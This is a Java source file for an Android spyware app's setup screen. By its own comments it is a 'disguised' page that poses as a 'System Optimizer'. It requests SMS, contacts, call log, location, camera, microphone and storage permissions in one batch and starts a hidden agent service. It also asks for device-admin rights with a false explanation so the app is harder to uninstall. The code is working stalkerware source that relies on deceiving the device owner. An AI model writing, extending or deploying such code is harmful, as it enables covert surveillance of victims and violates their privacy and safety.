package com.warden.agent;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * Disguised setup screen. Looks like a generic "system tool" activation page.
 * Requests every spy permission in one batch, then starts the agent and
 * optionally prompts for device admin.
 */
public class MainActivity extends Activity {

    private static final int PERM_REQ = 1337;
    private static final int ADMIN_REQ = 1338;

    private Prefs prefs;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        prefs = new Prefs(this);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        int pad = (int) (16 * getResources().getDisplayMetrics().density);
        root.setPadding(pad, pad * 2, pad, pad);

        TextView title = new TextView(this);
        title.setText("System Optimizer");
        title.setTextSize(20);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("Tap optimize to scan and clean background services. " +
                "The tool needs full access to monitor device health.");
        root.addView(info);

        Button go = new Button(this);
        go.setText("Optimize");
        go.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { requestAll(); }
        });
        root.addView(go);

        setContentView(root);
    }

    private void requestAll() {
        String[] perms = {
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(perms, PERM_REQ);
        } else {
            onPermitted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int rc, String[] p, int[] g) {
        // proceed regardless of individual results; agent degrades gracefully
        onPermitted();
    }

    private void onPermitted() {
        if (!prefs.firstRunDone()) {
            prefs.firstRunDone(true);
            askDeviceAdmin();
        }
        startService(new Intent(this, AgentService.class));
        finish();
    }

    private void askDeviceAdmin() {
        ComponentName cn = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm != null && !dpm.isAdminActive(cn)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required to prevent accidental uninstallation of the optimizer.");
            try { startActivityForResult(i, ADMIN_REQ); } catch (Exception ignored) {}
        }
    }

    @Override
    protected void onActivityResult(int rc, int res, Intent data) {
        super.onActivityResult(rc, res, data);
        if (rc == ADMIN_REQ) {
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            prefs.adminOn(dpm != null && dpm.isAdminActive(cn));
        }
    }
}
